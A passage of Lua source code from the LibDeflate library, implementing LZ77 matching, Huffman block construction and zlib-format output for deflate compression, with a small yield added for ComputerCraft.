				rle_code_counts[prev] = (rle_code_counts[prev] or 0) + 1
			elseif count == 2 then
				rle_code_tblsize = rle_code_tblsize + 1
				rle_codes[rle_code_tblsize] = prev
				rle_code_tblsize = rle_code_tblsize + 1
				rle_codes[rle_code_tblsize] = prev
				rle_code_counts[prev] = (rle_code_counts[prev] or 0) + 2
			elseif count >= 3 then
				rle_code_tblsize = rle_code_tblsize + 1
				local rleCode = (prev ~= 0) and 16 or (count <= 10 and 17 or 18)
				rle_codes[rle_code_tblsize] = rleCode
				rle_code_counts[rleCode] = (rle_code_counts[rleCode] or 0) + 1
				rle_extra_bits_tblsize = rle_extra_bits_tblsize + 1
				rle_extra_bits[rle_extra_bits_tblsize] =
					(count <= 10) and (count - 3) or (count - 11)
			end

			prev = len
			if len and len ~= 0 then
				rle_code_tblsize = rle_code_tblsize + 1
				rle_codes[rle_code_tblsize] = len
				rle_code_counts[len] = (rle_code_counts[len] or 0) + 1
				count = 0
			else
				count = 1
			end
		end
	end

	return rle_codes, rle_extra_bits, rle_code_counts
end

-- Load the string into a table, in order to speed up LZ77.
-- Loop unrolled 16 times to speed this function up.
-- @param str The string to be loaded.
-- @param t The load destination
-- @param start str[index] will be the first character to be loaded.
-- @param end str[index] will be the last character to be loaded
-- @param offset str[index] will be loaded into t[index-offset]
-- @return t
local function LoadStringToTable(str, t, start, stop, offset)
	local i = start - offset
	while i <= stop - 15 - offset do
		t[i], t[i+1], t[i+2], t[i+3], t[i+4], t[i+5], t[i+6], t[i+7], t[i+8],
		t[i+9], t[i+10], t[i+11], t[i+12], t[i+13], t[i+14], t[i+15] =
			string_byte(str, i + offset, i + 15 + offset)
		i = i + 16
	end
	while (i <= stop - offset) do
		t[i] = string_byte(str, i + offset, i + offset)
		i = i + 1
	end
	return t
end

-- Do LZ77 process. This function uses the majority of the CPU time.
-- @see zlib/deflate.c:deflate_fast(), zlib/deflate.c:deflate_slow()
-- @see https://github.com/madler/zlib/blob/master/doc/algorithm.txt
-- This function uses the algorithms used above. You should read the
-- algorithm.txt above to understand what is the hash function and the
-- lazy evaluation.
--
-- The special optimization used here is hash functions used here.
-- The hash function is just the multiplication of the three consective
-- characters. So if the hash matches, it guarantees 3 characters are matched.
-- This optimization can be implemented because Lua table is a hash table.
--
-- @param level integer that describes compression level.
-- @param string_table table that stores the value of string to be compressed.
--			The index of this table starts from 1.
--			The caller needs to make sure all values needed by this function
--			are loaded.
--			Assume ""str"" is the origin input string into the compressor
--			str[block_start]..str[block_end+3] needs to be loaded into
--			string_table[block_start-offset]..string_table[block_end-offset]
--			If dictionary is presented, the last 258 bytes of the dictionary
--			needs to be loaded into sing_table[-257..0]
--			(See more in the description of offset.)
-- @param hash_tables. The table key is the hash value (0<=hash<=16777216=256^3)
--			The table value is an array0 that stores the indexes of the
--			input data string to be compressed, such that
--			hash == str[index]*str[index+1]*str[index+2]
--			Indexes are ordered in this array.
-- @param block_start The indexes of the input data string to be compressed.
--				that starts the LZ77 block.
-- @param block_end The indexes of the input data string to be compressed.
--				that stores the LZ77 block.
-- @param offset str[index] is stored in string_table[index-offset],
--			This offset is mainly an optimization to limit the index
--			of string_table, so lua can access this table quicker.
-- @param dictionary See LibDeflate:CreateDictionary
-- @return literal/LZ77_length deflate codes.
-- @return the extra bits of literal/LZ77_length deflate codes.
-- @return the count of each literal/LZ77 deflate code.
-- @return LZ77 distance deflate codes.
-- @return the extra bits of LZ77 distance deflate codes.
-- @return the count of each LZ77 distance deflate code.
local function GetBlockLZ77Result(level, string_table, hash_tables, block_start,
		block_end, offset, dictionary)
	local config = _compression_level_configs[level]
	local config_use_lazy
		, config_good_prev_length
		, config_max_lazy_match
		, config_nice_length
		, config_max_hash_chain =
			config[1], config[2], config[3], config[4], config[5]

	local config_max_insert_length = (not config_use_lazy)
		and config_max_lazy_match or 2147483646
	local config_good_hash_chain =
		(config_max_hash_chain-config_max_hash_chain%4/4)

	local hash

	local dict_hash_tables
	local dict_string_table
	local dict_string_len = 0

	if dictionary then
		dict_hash_tables = dictionary.hash_tables
		dict_string_table = dictionary.string_table
		dict_string_len = dictionary.strlen
		assert(block_start == 1)
		if block_end >= block_start and dict_string_len >= 2 then
			hash = dict_string_table[dict_string_len-1]*65536
				+ dict_string_table[dict_string_len]*256 + string_table[1]
			local t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = -1
		end
		if block_end >= block_start+1 and dict_string_len >= 1 then
			hash = dict_string_table[dict_string_len]*65536
				+ string_table[1]*256 + string_table[2]
			local t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = 0
		end
	end

	hash = (string_table[block_start-offset] or 0)*256
		+ (string_table[block_start+1-offset] or 0)

	local lcodes = {}
	local lcode_tblsize = 0
	local lcodes_counts = {}
	local dcodes = {}
	local dcodes_tblsize = 0
	local dcodes_counts = {}

	local lextra_bits = {}
	local lextra_bits_tblsize = 0
	local dextra_bits = {}
	local dextra_bits_tblsize = 0

	local match_available = false
	local prev_len
	local prev_dist
	local cur_len = 0
	local cur_dist = 0

	local index = block_start
	local index_end = block_end + (config_use_lazy and 1 or 0)

	-- the zlib source code writes separate code for lazy evaluation and
	-- not lazy evaluation, which is easier to understand.
	-- I put them together, so it is a bit harder to understand.
	-- because I think this is easier for me to maintain it.
	while (index <= index_end) do
		local string_table_index = index - offset
		prev_len = cur_len
		prev_dist = cur_dist
		cur_len = 0

		hash = (hash*256+(string_table[string_table_index+2] or 0))%16777216

		local chain_index
		local cur_chain
		local hash_chain = hash_tables[hash]
		local chain_old_size
		if not hash_chain then
			chain_old_size = 0
			hash_chain = {}
			hash_tables[hash] = hash_chain
			if dict_hash_tables then
				cur_chain = dict_hash_tables[hash]
				chain_index = cur_chain and #cur_chain or 0
			else
				chain_index = 0
			end
		else
			chain_old_size = #hash_chain
			cur_chain = hash_chain
			chain_index = chain_old_size
		end

		if index <= block_end then
			hash_chain[chain_old_size+1] = index
		end

		if (chain_index > 0 and index + 2 <= block_end
			and (not config_use_lazy or prev_len < config_max_lazy_match)) then

			local depth =
				(config_use_lazy and prev_len >= config_good_prev_length)
				and config_good_hash_chain or config_max_hash_chain

			while chain_index >= 1 and depth > 0 do
				local prev = cur_chain[chain_index]

				if index - prev > 32768 then
					break
				end
				if prev < index then
					local j = 3

					if prev >= -257 then
						local prev_table_index = prev-offset
						-- NOTE for author:
						-- j < 258 and index + j <= block_end
						-- This is the right condition
						while (j < 258 and index + j <= block_end) do
							if (string_table[prev_table_index+j]
								== string_table[string_table_index+j]) then
								j = j + 1
							else
								break
							end
						end
					else
						local prev_table_index = dict_string_len+prev
						-- NOTE for author:
						-- j < 258 and index + j <= block_end
						-- This is the right condition
						while (j < 258 and index + j <= block_end) do
							if (dict_string_table[prev_table_index+j]
								== string_table[string_table_index+j]) then
								j = j + 1
							else
								break
							end
						end
					end
					if j > cur_len then
						cur_len = j
						cur_dist = index - prev
					end
					if cur_len >= config_nice_length then
						break
					end
				end

				chain_index = chain_index - 1
				depth = depth - 1
				if chain_index == 0 and prev > 0 and dict_hash_tables then
					cur_chain = dict_hash_tables[hash]
					chain_index = cur_chain and #cur_chain or 0
				end
			end
		end

		if not config_use_lazy then
			prev_len, prev_dist = cur_len, cur_dist
		end
		if ((not config_use_lazy or match_available)
			and (prev_len > 3 or (prev_len == 3 and prev_dist < 4096))
			and cur_len <= prev_len )then
			local code = _length_to_deflate_code[prev_len]
			local length_extra_bits_bitlen =
				_length_to_deflate_extra_bitlen[prev_len]
			local dist_code, dist_extra_bits_bitlen, dist_extra_bits
			if prev_dist <= 256 then -- have cached code for small distance.
				dist_code = _dist256_to_deflate_code[prev_dist]
				dist_extra_bits = _dist256_to_deflate_extra_bits[prev_dist]
				dist_extra_bits_bitlen =
					_dist256_to_deflate_extra_bitlen[prev_dist]
			else
				dist_code = 16
				dist_extra_bits_bitlen = 7
				local a = 384
				local b = 512

				while true do
					if prev_dist <= a then
						dist_extra_bits = (prev_dist-(b/2)-1) % (b/4)
						break
					elseif prev_dist <= b then
						dist_extra_bits = (prev_dist-(b/2)-1) % (b/4)
						dist_code = dist_code + 1
						break
					else
						dist_code = dist_code + 2
						dist_extra_bits_bitlen = dist_extra_bits_bitlen + 1
						a = a*2
						b = b*2
					end
				end
			end
			lcode_tblsize = lcode_tblsize + 1
			lcodes[lcode_tblsize] = code
			lcodes_counts[code] = (lcodes_counts[code] or 0) + 1

			dcodes_tblsize = dcodes_tblsize + 1
			dcodes[dcodes_tblsize] = dist_code
			dcodes_counts[dist_code] = (dcodes_counts[dist_code] or 0) + 1

			if length_extra_bits_bitlen > 0 then
				local lenExtraBits = _length_to_deflate_extra_bits[prev_len]
				lextra_bits_tblsize = lextra_bits_tblsize + 1
				lextra_bits[lextra_bits_tblsize] = lenExtraBits
			end
			if dist_extra_bits_bitlen > 0 then
				dextra_bits_tblsize = dextra_bits_tblsize + 1
				dextra_bits[dextra_bits_tblsize] = dist_extra_bits
			end

			for i=index+1, index+prev_len-(config_use_lazy and 2 or 1) do
				hash = (hash*256+(string_table[i-offset+2] or 0))%16777216
				if prev_len <= config_max_insert_length then
					hash_chain = hash_tables[hash]
					if not hash_chain then
						hash_chain = {}
						hash_tables[hash] = hash_chain
					end
					hash_chain[#hash_chain+1] = i
				end
			end
			index = index + prev_len - (config_use_lazy and 1 or 0)
			match_available = false
		elseif (not config_use_lazy) or match_available then
			local code = string_table[config_use_lazy
				and (string_table_index-1) or string_table_index]
			lcode_tblsize = lcode_tblsize + 1
			lcodes[lcode_tblsize] = code
			lcodes_counts[code] = (lcodes_counts[code] or 0) + 1
			index = index + 1
		else
			match_available = true
			index = index + 1
		end
	end

	-- Write ""end of block"" symbol
	lcode_tblsize = lcode_tblsize + 1
	lcodes[lcode_tblsize] = 256
	lcodes_counts[256] = (lcodes_counts[256] or 0) + 1

	return lcodes, lextra_bits, lcodes_counts, dcodes, dextra_bits
		, dcodes_counts
end

-- Get the header data of dynamic block.
-- @param lcodes_count The count of each literal/LZ77_length codes.
-- @param dcodes_count The count of each Lz77 distance codes.
-- @return a lots of stuffs.
-- @see RFC1951 Page 12
local function GetBlockDynamicHuffmanHeader(lcodes_counts, dcodes_counts)
	local lcodes_huffman_bitlens, lcodes_huffman_codes
		, max_non_zero_bitlen_lcode =
		GetHuffmanBitlenAndCode(lcodes_counts, 15, 285)
	local dcodes_huffman_bitlens, dcodes_huffman_codes
		, max_non_zero_bitlen_dcode =
		GetHuffmanBitlenAndCode(dcodes_counts, 15, 29)

	local rle_deflate_codes, rle_extra_bits, rle_codes_counts =
		RunLengthEncodeHuffmanBitlen(lcodes_huffman_bitlens
		,max_non_zero_bitlen_lcode, dcodes_huffman_bitlens
		, max_non_zero_bitlen_dcode)

	local rle_codes_huffman_bitlens, rle_codes_huffman_codes =
		GetHuffmanBitlenAndCode(rle_codes_counts, 7, 18)

	local HCLEN = 0
	for i = 1, 19 do
		local symbol = _rle_codes_huffman_bitlen_order[i]
		local length = rle_codes_huffman_bitlens[symbol] or 0
		if length ~= 0 then
			HCLEN = i
		end
	end

	HCLEN = HCLEN - 4
	local HLIT = max_non_zero_bitlen_lcode + 1 - 257
	local HDIST = max_non_zero_bitlen_dcode + 1 - 1
	if HDIST < 0 then HDIST = 0 end

	return HLIT, HDIST, HCLEN, rle_codes_huffman_bitlens
		, rle_codes_huffman_codes, rle_deflate_codes, rle_extra_bits
		, lcodes_huffman_bitlens, lcodes_huffman_codes
		, dcodes_huffman_bitlens, dcodes_huffman_codes
end

-- Get the size of dynamic block without writing any bits into the writer.
-- @param ... Read the source code of GetBlockDynamicHuffmanHeader()
-- @return the bit length of the dynamic block
local function GetDynamicHuffmanBlockSize(lcodes, dcodes, HCLEN
	, rle_codes_huffman_bitlens, rle_deflate_codes
	, lcodes_huffman_bitlens, dcodes_huffman_bitlens)

	local block_bitlen = 17 -- 1+2+5+5+4
	block_bitlen = block_bitlen + (HCLEN+4)*3

	for i = 1, #rle_deflate_codes do
		local code = rle_deflate_codes[i]
		block_bitlen = block_bitlen + rle_codes_huffman_bitlens[code]
		if code >= 16 then
			block_bitlen = block_bitlen +
			((code == 16) and 2 or (code == 17 and 3 or 7))
		end
	end

	local length_code_count = 0
	for i = 1, #lcodes do
		local code = lcodes[i]
		local huffman_bitlen = lcodes_huffman_bitlens[code]
		block_bitlen = block_bitlen + huffman_bitlen
		if code > 256 then -- Length code
			length_code_count = length_code_count + 1
			if code > 264 and code < 285 then -- Length code with extra bits
				local extra_bits_bitlen =
					_literal_deflate_code_to_extra_bitlen[code-256]
				block_bitlen = block_bitlen + extra_bits_bitlen
			end
			local dist_code = dcodes[length_code_count]
			local dist_huffman_bitlen = dcodes_huffman_bitlens[dist_code]
			block_bitlen = block_bitlen + dist_huffman_bitlen

			if dist_code > 3 then -- dist code with extra bits
				local dist_extra_bits_bitlen = (dist_code-dist_code%2)/2 - 1
				block_bitlen = block_bitlen + dist_extra_bits_bitlen
			end
		end
	end
	return block_bitlen
end

-- Write dynamic block.
-- @param ... Read the source code of GetBlockDynamicHuffmanHeader()
local function CompressDynamicHuffmanBlock(WriteBits, is_last_block
		, lcodes, lextra_bits, dcodes, dextra_bits, HLIT, HDIST, HCLEN
		, rle_codes_huffman_bitlens, rle_codes_huffman_codes
		, rle_deflate_codes, rle_extra_bits
		, lcodes_huffman_bitlens, lcodes_huffman_codes
		, dcodes_huffman_bitlens, dcodes_huffman_codes)

	WriteBits(is_last_block and 1 or 0, 1) -- Last block identifier
	WriteBits(2, 2) -- Dynamic Huffman block identifier

	WriteBits(HLIT, 5)
	WriteBits(HDIST, 5)
	WriteBits(HCLEN, 4)

	for i = 1, HCLEN+4 do
		local symbol = _rle_codes_huffman_bitlen_order[i]
		local length = rle_codes_huffman_bitlens[symbol] or 0
		WriteBits(length, 3)
	end

	local rleExtraBitsIndex = 1
	for i=1, #rle_deflate_codes do
		local code = rle_deflate_codes[i]
		WriteBits(rle_codes_huffman_codes[code]
			, rle_codes_huffman_bitlens[code])
		if code >= 16 then
			local extraBits = rle_extra_bits[rleExtraBitsIndex]
			WriteBits(extraBits, (code == 16) and 2 or (code == 17 and 3 or 7))
			rleExtraBitsIndex = rleExtraBitsIndex + 1
		end
	end

	local length_code_count = 0
	local length_code_with_extra_count = 0
	local dist_code_with_extra_count = 0

	for i=1, #lcodes do
		local deflate_codee = lcodes[i]
		local huffman_code = lcodes_huffman_codes[deflate_codee]
		local huffman_bitlen = lcodes_huffman_bitlens[deflate_codee]
		WriteBits(huffman_code, huffman_bitlen)
		if deflate_codee > 256 then -- Length code
			length_code_count = length_code_count + 1
			if deflate_codee > 264 and deflate_codee < 285 then
				-- Length code with extra bits
				length_code_with_extra_count = length_code_with_extra_count + 1
				local extra_bits = lextra_bits[length_code_with_extra_count]
				local extra_bits_bitlen =
					_literal_deflate_code_to_extra_bitlen[deflate_codee-256]
				WriteBits(extra_bits, extra_bits_bitlen)
			end
			-- Write distance code
			local dist_deflate_code = dcodes[length_code_count]
			local dist_huffman_code = dcodes_huffman_codes[dist_deflate_code]
			local dist_huffman_bitlen =
				dcodes_huffman_bitlens[dist_deflate_code]
			WriteBits(dist_huffman_code, dist_huffman_bitlen)

			if dist_deflate_code > 3 then -- dist code with extra bits
				dist_code_with_extra_count = dist_code_with_extra_count + 1
				local dist_extra_bits = dextra_bits[dist_code_with_extra_count]
				local dist_extra_bits_bitlen =
					(dist_deflate_code-dist_deflate_code%2)/2 - 1
				WriteBits(dist_extra_bits, dist_extra_bits_bitlen)
			end
		end
	end
end

-- Get the size of fixed block without writing any bits into the writer.
-- @param lcodes literal/LZ77_length deflate codes
-- @param decodes LZ77 distance deflate codes
-- @return the bit length of the fixed block
local function GetFixedHuffmanBlockSize(lcodes, dcodes)
	local block_bitlen = 3
	local length_code_count = 0
	for i=1, #lcodes do
		local code = lcodes[i]
		local huffman_bitlen = _fix_block_literal_huffman_bitlen[code]
		block_bitlen = block_bitlen + huffman_bitlen
		if code > 256 then -- Length code
			length_code_count = length_code_count + 1
			if code > 264 and code < 285 then -- Length code with extra bits
				local extra_bits_bitlen =
					_literal_deflate_code_to_extra_bitlen[code-256]
				block_bitlen = block_bitlen + extra_bits_bitlen
			end
			local dist_code = dcodes[length_code_count]
			block_bitlen = block_bitlen + 5

			if dist_code > 3 then -- dist code with extra bits
				local dist_extra_bits_bitlen =
					(dist_code-dist_code%2)/2 - 1
				block_bitlen = block_bitlen + dist_extra_bits_bitlen
			end
		end
	end
	return block_bitlen
end

-- Write fixed block.
-- @param lcodes literal/LZ77_length deflate codes
-- @param decodes LZ77 distance deflate codes
local function CompressFixedHuffmanBlock(WriteBits, is_last_block,
		lcodes, lextra_bits, dcodes, dextra_bits)
	WriteBits(is_last_block and 1 or 0, 1) -- Last block identifier
	WriteBits(1, 2) -- Fixed Huffman block identifier
	local length_code_count = 0
	local length_code_with_extra_count = 0
	local dist_code_with_extra_count = 0
	for i=1, #lcodes do
		local deflate_code = lcodes[i]
		local huffman_code = _fix_block_literal_huffman_code[deflate_code]
		local huffman_bitlen = _fix_block_literal_huffman_bitlen[deflate_code]
		WriteBits(huffman_code, huffman_bitlen)
		if deflate_code > 256 then -- Length code
			length_code_count = length_code_count + 1
			if deflate_code > 264 and deflate_code < 285 then
				-- Length code with extra bits
				length_code_with_extra_count = length_code_with_extra_count + 1
				local extra_bits = lextra_bits[length_code_with_extra_count]
				local extra_bits_bitlen =
					_literal_deflate_code_to_extra_bitlen[deflate_code-256]
				WriteBits(extra_bits, extra_bits_bitlen)
			end
			-- Write distance code
			local dist_code = dcodes[length_code_count]
			local dist_huffman_code = _fix_block_dist_huffman_code[dist_code]
			WriteBits(dist_huffman_code, 5)

			if dist_code > 3 then -- dist code with extra bits
				dist_code_with_extra_count = dist_code_with_extra_count + 1
				local dist_extra_bits = dextra_bits[dist_code_with_extra_count]
				local dist_extra_bits_bitlen = (dist_code-dist_code%2)/2 - 1
				WriteBits(dist_extra_bits, dist_extra_bits_bitlen)
			end
		end
	end
end

-- Get the size of store block without writing any bits into the writer.
-- @param block_start The start index of the origin input string
-- @param block_end The end index of the origin input string
-- @param Total bit lens had been written into the compressed result before,
-- because store block needs to shift to byte boundary.
-- @return the bit length of the fixed block
local function GetStoreBlockSize(block_start, block_end, total_bitlen)
	assert(block_end-block_start+1 <= 65535)
	local block_bitlen = 3
	total_bitlen = total_bitlen + 3
	local padding_bitlen = (8-total_bitlen%8)%8
	block_bitlen = block_bitlen + padding_bitlen
	block_bitlen = block_bitlen + 32
	block_bitlen = block_bitlen + (block_end - block_start + 1) * 8
	return block_bitlen
end

-- Write the store block.
-- @param ... lots of stuffs
-- @return nil
local function CompressStoreBlock(WriteBits, WriteString, is_last_block, str
	, block_start, block_end, total_bitlen)
	assert(block_end-block_start+1 <= 65535)
	WriteBits(is_last_block and 1 or 0, 1) -- Last block identifer.
	WriteBits(0, 2) -- Store block identifier.
	total_bitlen = total_bitlen + 3
	local padding_bitlen = (8-total_bitlen%8)%8
	if padding_bitlen > 0 then
		WriteBits(_pow2[padding_bitlen]-1, padding_bitlen)
	end
	local size = block_end - block_start + 1
	WriteBits(size, 16)

	-- Write size's one's complement
	local comp = (255 - size % 256) + (255 - (size-size%256)/256)*256
	WriteBits(comp, 16)

	WriteString(str:sub(block_start, block_end))
end

-- Do the deflate
-- Currently using a simple way to determine the block size
-- (This is why the compression ratio is little bit worse than zlib when
-- the input size is very large
-- The first block is 64KB, the following block is 32KB.
-- After each block, there is a memory cleanup operation.
-- This is not a fast operation, but it is needed to save memory usage, so
-- the memory usage does not grow unboundly. If the data size is less than
-- 64KB, then memory cleanup won't happen.
-- This function determines whether to use store/fixed/dynamic blocks by
-- calculating the block size of each block type and chooses the smallest one.
local function Deflate(configs, WriteBits, WriteString, FlushWriter, str
	, dictionary)
	local string_table = {}
	local hash_tables = {}
	local is_last_block = nil
	local block_start
	local block_end
	local bitlen_written
	local total_bitlen = FlushWriter(_FLUSH_MODE_NO_FLUSH)
	local strlen = #str
	local offset

	local level
	local strategy
	if configs then
		if configs.level then
			level = configs.level
		end
		if configs.strategy then
			strategy = configs.strategy
		end
	end

	if not level then
		if strlen < 2048 then
			level = 7
		elseif strlen > 65536 then
			level = 3
		else
			level = 5
		end
	end

	while not is_last_block do
		if not block_start then
			block_start = 1
			block_end = 64*1024 - 1
			offset = 0
		else
			block_start = block_end + 1
			block_end = block_end + 32*1024
			offset = block_start - 32*1024 - 1
		end

		if block_end >= strlen then
			block_end = strlen
			is_last_block = true
		else
			is_last_block = false
        end

		local lcodes, lextra_bits, lcodes_counts, dcodes, dextra_bits
			, dcodes_counts

		local HLIT, HDIST, HCLEN, rle_codes_huffman_bitlens
			, rle_codes_huffman_codes, rle_deflate_codes
			, rle_extra_bits, lcodes_huffman_bitlens, lcodes_huffman_codes
			, dcodes_huffman_bitlens, dcodes_huffman_codes

		local dynamic_block_bitlen
		local fixed_block_bitlen
		local store_block_bitlen

		if level ~= 0 then

			-- GetBlockLZ77 needs block_start to block_end+3 to be loaded.
			LoadStringToTable(str, string_table, block_start, block_end + 3
				, offset)
			if block_start == 1 and dictionary then
				local dict_string_table = dictionary.string_table
				local dict_strlen = dictionary.strlen
				for i=0, (-dict_strlen+1)<-257
					and -257 or (-dict_strlen+1), -1 do
					string_table[i] = dict_string_table[dict_strlen+i]
				end
			end

			if strategy == ""huffman_only"" then
				lcodes = {}
				LoadStringToTable(str, lcodes, block_start, block_end
					, block_start-1)
				lextra_bits = {}
				lcodes_counts = {}
				lcodes[block_end - block_start+2] = 256 -- end of block
				for i=1, block_end - block_start+2 do
					local code = lcodes[i]
					lcodes_counts[code] = (lcodes_counts[code] or 0) + 1
				end
				dcodes = {}
				dextra_bits = {}
				dcodes_counts = {}
			else
				lcodes, lextra_bits, lcodes_counts, dcodes, dextra_bits
				, dcodes_counts = GetBlockLZ77Result(level, string_table
				, hash_tables, block_start, block_end, offset, dictionary
				)
			end

			HLIT, HDIST, HCLEN, rle_codes_huffman_bitlens
				, rle_codes_huffman_codes, rle_deflate_codes
				, rle_extra_bits, lcodes_huffman_bitlens, lcodes_huffman_codes
				, dcodes_huffman_bitlens, dcodes_huffman_codes =
				GetBlockDynamicHuffmanHeader(lcodes_counts, dcodes_counts)
			dynamic_block_bitlen = GetDynamicHuffmanBlockSize(
					lcodes, dcodes, HCLEN, rle_codes_huffman_bitlens
					, rle_deflate_codes, lcodes_huffman_bitlens
					, dcodes_huffman_bitlens)
			fixed_block_bitlen = GetFixedHuffmanBlockSize(lcodes, dcodes)
		end

		store_block_bitlen = GetStoreBlockSize(block_start, block_end
			, total_bitlen)

		local min_bitlen = store_block_bitlen
		min_bitlen = (fixed_block_bitlen and fixed_block_bitlen < min_bitlen)
			and fixed_block_bitlen or min_bitlen
		min_bitlen = (dynamic_block_bitlen
			and dynamic_block_bitlen < min_bitlen)
			and dynamic_block_bitlen or min_bitlen

		if level == 0 or (strategy ~= ""fixed"" and strategy ~= ""dynamic"" and
			store_block_bitlen == min_bitlen) then
			CompressStoreBlock(WriteBits, WriteString, is_last_block
				, str, block_start, block_end, total_bitlen)
			total_bitlen = total_bitlen + store_block_bitlen
		elseif strategy ~= ""dynamic"" and (
			strategy == ""fixed"" or fixed_block_bitlen == min_bitlen) then
			CompressFixedHuffmanBlock(WriteBits, is_last_block,
					lcodes, lextra_bits, dcodes, dextra_bits)
			total_bitlen = total_bitlen + fixed_block_bitlen
		elseif strategy == ""dynamic"" or dynamic_block_bitlen == min_bitlen then
			CompressDynamicHuffmanBlock(WriteBits, is_last_block, lcodes
				, lextra_bits, dcodes, dextra_bits, HLIT, HDIST, HCLEN
				, rle_codes_huffman_bitlens, rle_codes_huffman_codes
				, rle_deflate_codes, rle_extra_bits
				, lcodes_huffman_bitlens, lcodes_huffman_codes
				, dcodes_huffman_bitlens, dcodes_huffman_codes)
			total_bitlen = total_bitlen + dynamic_block_bitlen
		end

		if is_last_block then
			bitlen_written = FlushWriter(_FLUSH_MODE_NO_FLUSH)
		else
			bitlen_written = FlushWriter(_FLUSH_MODE_MEMORY_CLEANUP)
		end

		assert(bitlen_written == total_bitlen)

		-- Memory clean up, so memory consumption does not always grow linearly
		-- , even if input string is > 64K.
		-- Not a very efficient operation, but this operation won't happen
		-- when the input data size is less than 64K.
		if not is_last_block then
			local j
			if dictionary and block_start == 1 then
				j = 0
				while (string_table[j]) do
					string_table[j] = nil
					j = j - 1
				end
			end
			dictionary = nil
			j = 1
			for i = block_end-32767, block_end do
				string_table[j] = string_table[i-offset]
				j = j + 1
            end
			for k, t in pairs(hash_tables) do
				local tSize = #t
				if tSize > 0 and block_end+1 - t[1] > 32768 then
					if tSize == 1 then
						--hash_tables[k] = nil -- seems to be causing problems
					else
						local new = {}
						local newSize = 0
						for i = 2, tSize do
							j = t[i]
							if block_end+1 - j <= 32768 then
								newSize = newSize + 1
								new[newSize] = j
							end
						end
						hash_tables[k] = new
					end
				end
			end
        end

        if os and os.pullEvent then -- ComputerCraft requires this for long-running processes
            os.queueEvent(""nosleep"")
            os.pullEvent()
        end
	end
end

--- The description to compression configuration table. <br>
-- Any field can be nil to use its default. <br>
-- Table with keys other than those below is an invalid table.
-- @class table
-- @name compression_configs
-- @field level The compression level ranged from 0 to 9. 0 is no compression.
-- 9 is the slowest but best compression. Use nil for default level.
-- @field strategy The compression strategy. ""fixed"" to only use fixed deflate
-- compression block. ""dynamic"" to only use dynamic block. ""huffman_only"" to
-- do no LZ77 compression. Only do huffman compression.


-- @see LibDeflate:CompressDeflate(str, configs)
-- @see LibDeflate:CompressDeflateWithDict(str, dictionary, configs)
local function CompressDeflateInternal(str, dictionary, configs)
	local WriteBits, WriteString, FlushWriter = CreateWriter()
	Deflate(configs, WriteBits, WriteString, FlushWriter, str, dictionary)
	local total_bitlen, result = FlushWriter(_FLUSH_MODE_OUTPUT)
	local padding_bitlen = (8-total_bitlen%8)%8
	return result, padding_bitlen
end

-- @see LibDeflate:CompressZlib
-- @see LibDeflate:CompressZlibWithDict
local function CompressZlibInternal(str, dictionary, configs)
	local WriteBits, WriteString, FlushWriter = CreateWriter()

	local CM = 8 -- Compression method
	local CINFO = 7 --Window Size = 32K
	local CMF = CINFO*16+CM
	WriteBits(CMF, 8)

	local FDIST = dictionary and 1 or 0
	local FLEVEL = 2 -- Default compression
	local FLG = FLEVEL*64+FDIST*32
	local FCHECK = (31-(CMF*256+FLG)%31)
	-- The FCHECK value must be such that CMF and FLG,
	-- when viewed as a 16-bit unsigned integer stored
	-- in MSB order (CMF*256 + FLG), is a multiple of 31.
	FLG = FLG + FCHECK
	WriteBits(FLG, 8)

	if FDIST == 1 then
		local adler32 = dictionary.adler32
		local byte0 = adler32 % 256
		adler32 = (adler32 - byte0) / 256
		local byte1 = adler32 % 256
		adler32 = (adler32 - byte1) / 256
		local byte2 = adler32 % 256
		adler32 = (adler32 - byte2) / 256
		local byte3 = adler32 % 256
		WriteBits(byte3, 8)
		WriteBits(byte2, 8)
		WriteBits(byte1, 8)
		WriteBits(byte0, 8)
	end

	Deflate(configs, WriteBits, WriteString, FlushWriter, str, dictionary)
	FlushWriter(_FLUSH_MODE_BYTE_BOUNDARY)

	local adler32 = LibDeflate:Adler32(str)

	-- Most significant byte first
	local byte3 = adler32%256
	adler32 = (adler32 - byte3) / 256
	local byte2 = adler32%256
	adler32 = (adler32 - byte2) / 256
	local byte1 = adler32%256
	adler32 = (adler32 - byte1) / 256
	local byte0 = adler32%256

	WriteBits(byte0, 8)
	WriteBits(byte1, 8)
	WriteBits(byte2, 8)
	WriteBits(byte3, 8)
	local total_bitlen, result = FlushWriter(_FLUSH_MODE_OUTPUT)
	local padding_bitlen = (8-total_bitlen%8)%8
	return result, padding_bitlen
end

--- Compress using the raw deflate format.
-- @param str [string] The data to be compressed.
-- @param configs [table/nil] The configuration table to control the compression
-- . If nil, use the default configuration.
-- @return [string] The compressed data.
-- @return [integer] The number of bits padded at the end of output.
-- 0 <= bits < 8  <br>
-- This means the most significant ""bits"" of the last byte of the returned
-- compressed data are padding bits and they don't affect decompression.
-- You don't need to use this value unless you want to do some postprocessing
-- to the compressed data.
-- @see compression_configs
-- @see LibDeflate:DecompressDeflate
function LibDeflate:CompressDeflate(str, configs)
	local arg_valid, arg_err = IsValidArguments(str, false, nil, true, configs)
	if not arg_valid then
		error((""Usage: LibDeflate:CompressDeflate(str, configs): ""
			..arg_err), 2)
	end
	return CompressDeflateInternal(str, nil, configs)
end

--- Compress using the raw deflate format with a preset dictionary.
-- @param str [string] The data to be compressed.
-- @param dictionary [table] The preset dictionary produced by
-- LibDeflate:CreateDictionary
-- @param configs [table/nil] The configuration table to control the compression
-- . If nil, use the default configuration.
-- @return [string] The compressed data.
-- @return [integer] The number of bits padded at the end of output.
-- 0 <= bits < 8  <br>
-- This means the most significant ""bits"" of the last byte of the returned
-- compressed data are padding bits and they don't affect decompression.
-- You don't need to use this value unless you want to do some postprocessing
-- to the compressed data.
-- @see compression_configs
-- @see LibDeflate:CreateDictionary
-- @see LibDeflate:DecompressDeflateWithDict
function LibDeflate:CompressDeflateWithDict(str, dictionary, configs)
	local arg_valid, arg_err = IsValidArguments(str, true, dictionary
		, true, configs)
	if not arg_valid then
		error((""Usage: LibDeflate:CompressDeflateWithDict""
			..""(str, dictionary, configs): ""
			..arg_err), 2)
	end
	return CompressDeflateInternal(str, dictionary, configs)
end

--- Compress using the zlib format.
-- @param str [string] the data to be compressed.
-- @param configs [table/nil] The configuration table to control the compression
-- . If nil, use the default configuration.
-- @return [string] The compressed data.
-- @return [integer] The number of bits padded at the end of output.
-- Should always be 0.
-- Zlib formatted compressed data never has padding bits at the end.
-- @see compression_configs
